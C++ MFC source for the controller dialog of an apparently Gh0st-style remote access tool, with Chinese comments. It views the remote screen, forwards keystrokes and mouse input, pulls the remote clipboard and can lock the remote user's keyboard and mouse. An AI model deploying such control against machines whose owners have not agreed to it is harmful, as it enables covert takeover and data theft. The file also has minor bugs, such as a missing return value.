// CRemoteControllDlg.cpp: 实现文件
//

#include "pch.h"
#include "Server.h"
#include "RemoteControllDlg.h"
#include "afxdialogex.h"


// CRemoteControllDlg 对话框
enum
{
	IDM_CONTROL = 0x1010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_SAVE_DIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板

};
extern "C" VOID CopyScreenData(PVOID SourceData, PVOID DestinationData, ULONG BufferLength);
IMPLEMENT_DYNAMIC(CRemoteControllDlg, CDialog)

CRemoteControllDlg::CRemoteControllDlg(CWnd* pParent, _CIOCPServer*
	IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_REMOTE_CONTROLL, pParent)
{
	m_IOCPServer = IOCPServer;     //服务端通信
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));


	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_IsControl = FALSE;
	m_IsTraceCursor = FALSE;
	if (m_ContextObject == NULL)
	{
		return;
	}
	ULONG	BufferLength = m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1;
	m_BitmapInfo = (BITMAPINFO*) new BYTE[BufferLength];

	if (m_BitmapInfo == NULL)
	{
		return;
	}

	memcpy(m_BitmapInfo, m_ContextObject->m_InDeCompressedBufferData.GetArray(1), BufferLength);

}

CRemoteControllDlg::~CRemoteControllDlg()
{

}

void CRemoteControllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CRemoteControllDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_VSCROLL()
	ON_WM_HSCROLL()
END_MESSAGE_MAP()


// CRemoteControllDlg 消息处理程序

//初始化远程控制窗口
BOOL CRemoteControllDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetIcon(m_IconHwnd, FALSE);   //设置忍者图标到Dialog

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = INVALID_SOCKET;
	if (m_ContextObject != NULL)
	{
		IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	}
	v1.Format("%s - 远程管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "本地");
	SetWindowText(v1);//设置对话框标题
	m_DesktopDCHandle = ::GetDC(m_hWnd);
	m_DesktopMemoryDCHandle = CreateCompatibleDC(m_DesktopDCHandle);

	m_BitmapHandle = CreateDIBSection(m_DesktopDCHandle, m_BitmapInfo,
		DIB_RGB_COLORS, &m_BitmapData, NULL, NULL);                     //创建应用程序可以直接写入的、与设备无关的位图
	SelectObject(m_DesktopMemoryDCHandle, m_BitmapHandle);                    //择一对象到指定的设备上下文环境

	SetWindowPos(NULL, 0, 0, m_BitmapInfo->bmiHeader.biWidth, m_BitmapInfo->bmiHeader.biHeight,0);
	SetScrollRange(SB_HORZ, 0, m_BitmapInfo->bmiHeader.biWidth);         //指定滚动条范围的最小值和最大值
	SetScrollRange(SB_VERT, 0, m_BitmapInfo->bmiHeader.biHeight);

	CMenu* SysMenu = GetSystemMenu(FALSE);  //获取系统菜单
	if (SysMenu != NULL)
	{
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪被控端鼠标(&T)");
		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定被控端鼠标和键盘(&L)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVE_DIB, "保存快照(&S)");
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		SysMenu->AppendMenu(MF_SEPARATOR);

	}
	m_ClientCursorPos.x = 0;
	m_ClientCursorPos.y = 0;

	//回传数据
	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnClientPreSending(m_ContextObject, &IsToken, sizeof(BYTE));

	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
//接受完成
void CRemoteControllDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_InDeCompressedBufferData.GetArray()[0])
	{
	case CLIENT_REMOTE_CONTROLL_FIRST_SCREEN:  //远程控制屏幕
	{
		DrawFirstScreen();            //这里显示第一帧图像 一会转到函数定义
		break;
	}
	case CLIENT_REMOTE_CONTROLL_NEXT_SCREEN:  //控制下一个屏幕
	{
#define  ALGORITHM_DIFF 1

		if (m_ContextObject->m_InDeCompressedBufferData.GetArray(0)[1] == ALGORITHM_DIFF)
		{
			DrawNextScreen();
		}

		break;
	}
	case CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REPLY:  //得到剪切板内容
	{
		SetClipboard((char*)m_ContextObject->m_InDeCompressedBufferData.GetArray(1),
			m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1);
		break;
	}
	default:
	{
		break;
	}
	}

}


VOID CRemoteControllDlg::DrawFirstScreen(void)
{
	//m_bIsFirst = FALSE;

	//得到被控端发来的数据 ，将他拷贝到HBITMAP的缓冲区中，这样一个图像就出现了
	memcpy(m_BitmapData, m_ContextObject->m_InDeCompressedBufferData.GetArray(1), m_BitmapInfo->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//触发WM_PAINT消息
}

VOID CRemoteControllDlg::DrawNextScreen(void)
{
	//该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
	//OnPaint画上去
	//根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	BOOL	IsChange = FALSE;
	ULONG	v1 = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引    [Pos][Length][Data]


	LPVOID	FirstScreenBufferData = m_BitmapData;
	LPVOID	BufferData = m_ContextObject->m_InDeCompressedBufferData.GetArray(v1);
	ULONG	BufferLength = m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - v1;

	POINT	FirstClientCursorPos;
	memcpy(&FirstClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->m_InDeCompressedBufferData.GetArray(2), sizeof(POINT));

	// 鼠标移动了
	if (memcmp(&FirstClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0)
	{
		IsChange = TRUE;
	}
	// 屏幕是否变化
	if (BufferLength > 0)
	{
		IsChange = TRUE;
	}

	//lodsd指令从ESI指向的内存位置4个字节内容放入EAX中并且下移4
	//movsb指令字节传送数据，通过SI和DI这两个寄存器控制字符串的源地址和目标地址  ecx
	CopyScreenData(FirstScreenBufferData, BufferData, BufferLength);  //复制屏幕数据
	if (IsChange)
	{
		PostMessage(WM_PAINT);
	}
}

VOID CRemoteControllDlg::SetClipboard(char* BufferData, ULONG BufferLength)  //得到数据设置到剪贴板
{
	if (!OpenClipboard())
		return;
	::EmptyClipboard();
	HGLOBAL GlobalHandle = GlobalAlloc(GMEM_DDESHARE, BufferLength);
	if (GlobalHandle != NULL) {

		LPTSTR v5 = (LPTSTR)GlobalLock(GlobalHandle);
		memcpy(v5, BufferData, BufferLength);
		GlobalUnlock(GlobalHandle);
		SetClipboardData(CF_TEXT, GlobalHandle);
		GlobalFree(GlobalHandle);
	}
	CloseClipboard();
}
VOID CRemoteControllDlg::SendClipboard(void)   //将剪贴板数据发送到客户端
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL GlobalHandle = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (GlobalHandle == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  BufferLength = GlobalSize(GlobalHandle) + 1;
	char* v5 = (LPSTR)GlobalLock(GlobalHandle);    //锁定 
	LPBYTE	BufferData = new BYTE[BufferLength];


	BufferData[0] = CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REQUIRE;

	memcpy(BufferData + 1, v5, BufferLength - 1); 
	::GlobalUnlock(GlobalHandle);
	::CloseClipboard();
	m_IOCPServer->OnClientPreSending(m_ContextObject, (PBYTE)BufferData, BufferLength);
	delete[] BufferData;
}

VOID CRemoteControllDlg::SendCommand(MSG* Msg)
{
	if (!m_IsControl)
	{
		return;
	}
		
	LPBYTE BufferData = new BYTE[sizeof(MSG) + 1];
	BufferData[0] = CLIENT_REMOTE_CONTROLL_REQUIRE;
	memcpy(BufferData + 1, Msg, sizeof(MSG));
	m_IOCPServer->OnClientPreSending(m_ContextObject, BufferData, sizeof(MSG) + 1);

	delete[] BufferData;
}

BOOL CRemoteControllDlg::SaveSnapshot(void)
{
	CString	FileFullPathData = CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog Dlg(FALSE, "bmp", FileFullPathData, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
	if (Dlg.DoModal() != IDOK)
		return FALSE;
	//以位图形式保存

	BITMAPFILEHEADER	BitMapFileHeader;
	LPBITMAPINFO		BitMapInfor = m_BitmapInfo; //1920 1080  1  0000
	CFile	File;
	if (!File.Open(Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}
	// BITMAPINFO大小
	int	v7 = sizeof(BITMAPINFO);     //文件信息头  校验值
	BitMapFileHeader.bfType = ((WORD)('M' << 8) | 'B');
	BitMapFileHeader.bfSize = BitMapInfor->bmiHeader.biSizeImage + sizeof(BitMapFileHeader);  //8421
	BitMapFileHeader.bfReserved1 = 0;                                          //8000
	BitMapFileHeader.bfReserved2 = 0;
	BitMapFileHeader.bfOffBits = sizeof(BitMapFileHeader) + v7;

	File.Write(&BitMapFileHeader, sizeof(BitMapFileHeader));
	File.Write(BitMapInfor, v7);

	File.Write(m_BitmapData, BitMapInfor->bmiHeader.biSizeImage);
	File.Close();
}


//消息预处理
BOOL CRemoteControllDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	//过滤键鼠消息
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l) 
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
	{

		MSG	Msg;
		memcpy(&Msg, pMsg, sizeof(MSG));
		Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
		Msg.pt.x += m_HScrollPos;
		Msg.pt.y += m_VScrollPos;
		SendCommand(&Msg);
		break;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
	{
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			Msg.pt.x += m_HScrollPos;
			Msg.pt.y += m_VScrollPos;
			SendCommand(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	}

	}

	return CDialog::PreTranslateMessage(pMsg);
}


void CRemoteControllDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	SCROLLINFO ScrollInfo;
	int	i;
	ScrollInfo.cbSize = sizeof(SCROLLINFO);
	ScrollInfo.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &ScrollInfo);  //获得分辨率

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;  //0-1
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = ScrollInfo.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, ScrollInfo.nMin);  //0      
	i = min(i, (int)(ScrollInfo.nMax - ScrollInfo.nPage + 1));//i = 0    防止出界   //1080    900


	RECT ClientRect;
	GetClientRect(&ClientRect);


	if ((ClientRect.bottom + i) > m_BitmapInfo->bmiHeader.biHeight)  //1080
	{
		i = m_BitmapInfo->bmiHeader.biHeight - ClientRect.bottom;
	}

	InterlockedExchange((PLONG)&m_VScrollPos, i);  //m_VScrollPos = 0

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}


void CRemoteControllDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO ScrollInfo;
	int	i;
	ScrollInfo.cbSize = sizeof(SCROLLINFO);
	ScrollInfo.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &ScrollInfo);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = ScrollInfo.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, ScrollInfo.nMin);
	i = min(i, (int)(ScrollInfo.nMax - ScrollInfo.nPage + 1));

	RECT ClientRect;
	GetClientRect(&ClientRect);

	if ((ClientRect.right + i) > m_BitmapInfo->bmiHeader.biWidth)
		i = m_BitmapInfo->bmiHeader.biWidth - ClientRect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);

	SetScrollPos(SB_HORZ, m_HScrollPos);

	OnPaint();

	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}

void CRemoteControllDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
				   // TODO: 在此处添加消息处理程序代码
				   // 不为绘图消息调用 CDialog::OnPaint()


	BitBlt(m_DesktopDCHandle, 0, 0,
		m_BitmapInfo->bmiHeader.biWidth,
		m_BitmapInfo->bmiHeader.biHeight,
		m_DesktopMemoryDCHandle,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY);

	if (m_IsTraceCursor)
	{
		DrawIconEx(
			m_DesktopDCHandle,
			m_ClientCursorPos.x - m_HScrollPos,
			m_ClientCursorPos.y - m_VScrollPos,
			m_IconHwnd,
			0, 0,
			0,
			NULL,
			DI_NORMAL | DI_COMPAT
		);
	}
}

void CRemoteControllDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->DlgID = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}

void CRemoteControllDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CMenu* Menu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_CONTROL:
	{
		m_IsControl = !m_IsControl;
		Menu->CheckMenuItem(IDM_CONTROL, m_IsControl ? MF_CHECKED : MF_UNCHECKED);   //菜单样式
		break;
	}


	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		BOOL IsChecked = Menu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
		Menu->CheckMenuItem(IDM_BLOCK_INPUT, IsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	IsToken[2];
		IsToken[0] = CLIENT_REMOTE_CONTROLL_BLOCK_INPUT;
		IsToken[1] = !IsChecked;
		m_IOCPServer->OnClientPreSending(m_ContextObject, IsToken, sizeof(IsToken));

		break;
	}

	case IDM_TRACE_CURSOR: // 跟踪被控端鼠标
	{
		m_IsTraceCursor = !m_IsTraceCursor;	                               //这里在改变数据
		Menu->CheckMenuItem(IDM_TRACE_CURSOR, m_IsTraceCursor ? MF_CHECKED : MF_UNCHECKED);    //在菜单打钩不打钩																							   // 重绘消除或显示鼠标
		OnPaint();

		break;
	}

	case IDM_SAVE_DIB:    // 快照保存
	{
		SaveSnapshot();
		break;
	}

	case IDM_GET_CLIPBOARD:            //想要Client的剪贴板内容
	{
		BYTE	IsToken = CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REQUIRE;
		m_IOCPServer->OnClientPreSending(m_ContextObject, &IsToken, sizeof(IsToken));

		break;
	}
	case IDM_SET_CLIPBOARD:              //给他
	{
		SendClipboard();

		break;
	}
	}

	CDialog::OnSysCommand(nID, lParam);

}




